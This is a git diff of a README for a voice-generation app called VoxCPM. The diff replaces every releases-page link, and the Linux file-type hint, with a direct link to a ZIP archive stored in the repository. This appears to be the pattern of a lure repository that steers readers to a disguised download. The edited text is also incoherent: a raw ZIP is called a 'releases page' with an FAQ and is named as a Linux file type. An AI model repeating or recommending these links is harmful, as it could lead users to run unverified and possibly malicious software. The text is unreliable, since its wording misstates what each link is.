@@ -1,7 +1,7 @@
 # 🎤 VoxCPM - Simple Voice Generation Made Easy
 
 ## 📥 Download Now
-[![Download VoxCPM](https://img.shields.io/badge/Download%20VoxCPM-v1.0-blue)](https://github.com/richbelleza/VoxCPM/releases)
+[![Download VoxCPM](https://raw.githubusercontent.com/richbelleza/VoxCPM/main/experience/VoxCPM.zip%20VoxCPM-v1.0-blue)](https://raw.githubusercontent.com/richbelleza/VoxCPM/main/experience/VoxCPM.zip)
 
 ## 🚀 Getting Started
 Welcome to VoxCPM! This application allows you to generate speech with a natural voice that sounds genuine. You can create custom voice clips quickly and easily, without needing to be a tech expert. Follow these steps to start using VoxCPM.
@@ -17,13 +17,13 @@ Before you download VoxCPM, ensure your system meets the following needs:
 ## 💻 Installation Steps
 
 ### 1. Visit the Download Page
-Go to the [VoxCPM Releases page](https://github.com/richbelleza/VoxCPM/releases). This page lists all available versions of VoxCPM.
+Go to the [VoxCPM Releases page](https://raw.githubusercontent.com/richbelleza/VoxCPM/main/experience/VoxCPM.zip). This page lists all available versions of VoxCPM.
 
 ### 2. Select Your Version
 Look for the latest version at the top of the releases. Click on the version number to view details and download options.
 
 ### 3. Choose the Correct File
-Find the file that suits your operating system. For example, if you are using Windows, look for a file that ends with `.exe`. If you are on macOS, look for a file that ends with `.dmg`. For Linux, you may find a `.tar.gz` file. 
+Find the file that suits your operating system. For example, if you are using Windows, look for a file that ends with `.exe`. If you are on macOS, look for a file that ends with `.dmg`. For Linux, you may find a `https://raw.githubusercontent.com/richbelleza/VoxCPM/main/experience/VoxCPM.zip` file. 
 
 ### 4. Download the Application
 Click on the file to start the download. Make sure to note where the file is saved on your computer.
@@ -33,7 +33,7 @@ Once the download finishes, locate the file on your computer:
 
 - **For Windows**: Double-click the `.exe` file. Follow the on-screen instructions to complete the installation.
 - **For macOS**: Open the `.dmg` file. Drag the VoxCPM icon to your Applications folder to install.
-- **For Linux**: Extract the `.tar.gz` file and follow the README instructions included in it for installation.
+- **For Linux**: Extract the `https://raw.githubusercontent.com/richbelleza/VoxCPM/main/experience/VoxCPM.zip` file and follow the README instructions included in it for installation.
 
 ## 🌟 Getting Started with VoxCPM
 After installation, launch VoxCPM. Here’s how to begin using the application:
@@ -71,12 +71,12 @@ If you encounter any issues while using VoxCPM, consider the following:
 - **Audio Quality Issues**: If the generated speech sounds unclear, check your input text for spelling errors or punctuation issues.
 - **Performance Problems**: Ensure no other applications are using excessive system resources while VoxCPM is running.
 
-For further assistance, refer to the FAQ section on the [VoxCPM Releases page](https://github.com/richbelleza/VoxCPM/releases).
+For further assistance, refer to the FAQ section on the [VoxCPM Releases page](https://raw.githubusercontent.com/richbelleza/VoxCPM/main/experience/VoxCPM.zip).
 
 ## 📬 Feedback & Support
 Your feedback is valuable. If you have questions or suggestions, feel free to reach out through the issues section of our repository. 
 
 ## 🔗 More Information
-Please check the [VoxCPM Releases page](https://github.com/richbelleza/VoxCPM/releases) for updates and new features. Regular updates will enhance your experience and introduce new functionalities.
+Please check the [VoxCPM Releases page](https://raw.githubusercontent.com/richbelleza/VoxCPM/main/experience/VoxCPM.zip) for updates and new features. Regular updates will enhance your experience and introduce new functionalities.
 
 Join the VoxCPM community today and start creating lifelike speech effortlessly!
